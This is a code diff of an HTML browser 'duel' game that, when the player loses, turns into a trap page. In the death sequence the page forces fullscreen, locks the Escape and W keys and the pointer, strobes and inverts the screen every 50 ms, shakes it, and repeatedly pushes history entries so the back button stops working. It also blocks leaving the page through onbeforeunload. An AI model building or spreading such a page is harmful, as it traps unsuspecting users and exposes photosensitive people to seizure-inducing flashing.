@@ -2,28 +2,53 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Fatal Duel</title>
+    <title>The Duel</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: black; overflow: hidden; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; color: white; }
-        #game-ui { text-align: center; z-index: 5; }
-        #scary-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('./scary.gif') center/cover; display: none; z-index: 1000; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #050505; overflow: hidden; font-family: 'Courier New', monospace; color: white; }
         
-        /* Quick Death Text */
-        #death-text {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            display: none; justify-content: center; align-items: center;
-            background: black; z-index: 2000;
-            color: #ff0000; font-size: 80px; font-weight: bold;
-            text-shadow: 5px 5px #550000; letter-spacing: 10px;
+        /* THE ENEMY (Animated Monstrous Shadow) */
+        #enemy {
+            position: absolute; top: 20%; left: 50%; transform: translateX(-50%);
+            width: 300px; height: 400px;
+            background: radial-gradient(circle, #1a1a1a 0%, transparent 70%);
+            filter: blur(10px); animation: breathe 3s ease-in-out infinite;
         }
+        .eye {
+            position: absolute; top: 30%; width: 20px; height: 10px;
+            background: #ff0000; border-radius: 50%; box-shadow: 0 0 20px #ff0000;
+            animation: blink 4s infinite;
+        }
+        .eye.left { left: 35%; } .eye.right { right: 35%; }
+        
+        @keyframes breathe {
+            0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.7; }
+            50% { transform: translateX(-50%) scale(1.1); opacity: 1; }
+        }
+        @keyframes blink { 0%, 90%, 100% { height: 10px; } 95% { height: 0px; } }
 
-        button { padding: 20px 40px; font-size: 24px; cursor: pointer; background: #111; color: #cc0000; border: 2px solid #cc0000; text-transform: uppercase; font-weight: bold; margin-top: 20px; transition: 0.3s; }
-        button:disabled { border-color: #444; color: #444; cursor: not-allowed; }
-        #status { font-size: 22px; margin-bottom: 10px; color: #ff00ea; }
+        /* THE GUN (CSS First-Person Revolver) */
+        #gun-container {
+            position: absolute; bottom: -20px; left: 50%; transform: translateX(-50%);
+            width: 200px; height: 300px; transition: transform 0.1s; z-index: 10;
+        }
+        .barrel { width: 60px; height: 150px; background: #222; margin: 0 auto; border-radius: 5px 5px 0 0; border: 2px solid #111; }
+        .cylinder { width: 80px; height: 80px; background: #333; margin: -10px auto; border-radius: 10px; border: 3px solid #111; }
+        
+        /* Gun Recoil Animation */
+        .recoil { animation: kick 0.2s ease-out; }
+        @keyframes kick { 0% { transform: translateX(-50%) translateY(0) rotate(0deg); } 50% { transform: translateX(-50%) translateY(-50px) rotate(-10deg); } 100% { transform: translateX(-50%) translateY(0) rotate(0deg); } }
+
+        /* UI and Screens */
+        #game-ui { position: absolute; bottom: 10%; width: 100%; text-align: center; z-index: 20; }
+        #scary-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('./scary.gif') center/cover; display: none; z-index: 1000; }
+        #death-text { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; justify-content: center; align-items: center; background: black; z-index: 2000; color: #ff0000; font-size: 80px; font-weight: bold; }
+        
+        button { padding: 15px 30px; font-size: 20px; cursor: pointer; background: transparent; color: #ff0000; border: 2px solid #ff0000; text-transform: uppercase; font-weight: bold; }
+        button:hover { background: #ff0000; color: black; }
     </style>
 </head>
 <body>
-    <!-- SVG Filter for Chromatic Aberration -->
+
     <svg style="position: absolute; width: 0; height: 0;">
       <filter id="chromatic">
         <feColorMatrix in="SourceGraphic" type="matrix" values="1 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 1 0" result="r"/>
@@ -36,9 +61,19 @@
       </filter>
     </svg>
 
+    <div id="enemy">
+        <div class="eye left"></div>
+        <div class="eye right"></div>
+    </div>
+
+    <div id="gun-container">
+        <div class="barrel"></div>
+        <div class="cylinder"></div>
+    </div>
+
     <div id="game-ui">
-        <div id="status">PLAYER VS AI</div>
-        <button id="trigger-btn">PULL TRIGGER</button>
+        <div id="status" style="margin-bottom: 20px; color: #888;">IT'S YOUR TURN</div>
+        <button id="trigger-btn">FIRE</button>
     </div>
 
     <div id="death-text">YOU DIED</div>
@@ -47,6 +82,7 @@
 
     <script>
         const triggerBtn = document.getElementById('trigger-btn');
+        const gun = document.getElementById('gun-container');
         const status = document.getElementById('status');
         const scaryScreen = document.getElementById('scary-screen');
         const deathText = document.getElementById('death-text');
@@ -57,81 +93,71 @@
 
         triggerBtn.addEventListener('click', () => {
             if (!isPlayerTurn) return;
+            
+            // Gun Animation
+            gun.classList.add('recoil');
+            setTimeout(() => gun.classList.remove('recoil'), 200);
+
             if (Math.floor(Math.random() * 6) + 1 === 1) {
                 deathSequence();
             } else {
                 status.innerText = "CLICK... SURVIVED.";
                 isPlayerTurn = false;
-                triggerBtn.disabled = true;
-                setTimeout(aiTurn, 1000);
+                triggerBtn.style.display = 'none';
+                setTimeout(aiTurn, 1500);
             }
         });
 
         function aiTurn() {
-            status.innerText = "AI IS PULLING...";
+            status.innerText = "THE ENEMY IS SPINNING...";
             setTimeout(() => {
                 if (Math.floor(Math.random() * 6) + 1 === 1) {
-                    status.innerText = "AI DIED. RESETTING...";
+                    status.innerText = "THE ENEMY DIED. REBOOTING...";
                     setTimeout(() => location.reload(), 2000);
                 } else {
-                    status.innerText = "AI SURVIVED. YOUR TURN.";
+                    status.innerText = "THE ENEMY SURVIVED. FIRE.";
                     isPlayerTurn = true;
-                    triggerBtn.disabled = false;
+                    triggerBtn.style.display = 'inline-block';
                 }
-            }, 1000);
+            }, 1500);
         }
 
         async function deathSequence() {
-            // Show "YOU DIED" quickly
             document.getElementById('game-ui').style.display = 'none';
             deathText.style.display = 'flex';
-            
             setTimeout(async () => {
                 deathText.style.display = 'none';
                 scaryScreen.style.display = 'block';
                 scream.play().catch(() => {});
-
+                
                 const elem = document.documentElement;
                 try {
                     if (elem.requestFullscreen) await elem.requestFullscreen();
-                    if (navigator.keyboard && navigator.keyboard.lock) {
-                        await navigator.keyboard.lock(["Escape", "KeyW"]);
-                    }
+                    if (navigator.keyboard && navigator.keyboard.lock) await navigator.keyboard.lock(["Escape", "KeyW"]);
                     if (elem.requestPointerLock) elem.requestPointerLock();
                 } catch (err) {}
-
                 startChaos();
             }, 800);
         }
 
         function startChaos() {
-            // Strobe + Chromatic Aberration Pulse
             setInterval(() => {
-                const intensity = Math.random() * 15;
+                const intensity = Math.random() * 20;
                 rOff.setAttribute('dx', intensity);
                 bOff.setAttribute('dx', -intensity);
-
-                scaryScreen.style.filter = Math.random() > 0.8 ? 
-                    'url(#chromatic) invert(1) brightness(1.5)' : 'url(#chromatic)';
+                scaryScreen.style.filter = Math.random() > 0.8 ? 'url(#chromatic) invert(1)' : 'url(#chromatic)';
             }, 50);
 
-            // Extreme Shake
             setInterval(() => {
                 const x = (Math.random() - 0.5) * 60;
                 const y = (Math.random() - 0.5) * 60;
                 scaryScreen.style.transform = `translate(${x}px, ${y}px)`;
             }, 30);
 
-            // Back Button Trap
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = () => window.history.go(1);
             setInterval(() => window.history.pushState(null, "", window.location.href), 100);
-
             window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };
-
-            document.addEventListener('fullscreenchange', () => {
-                if (!document.fullscreenElement) scaryScreen.onclick = () => deathSequence();
-            });
         }
     </script>
 </body>
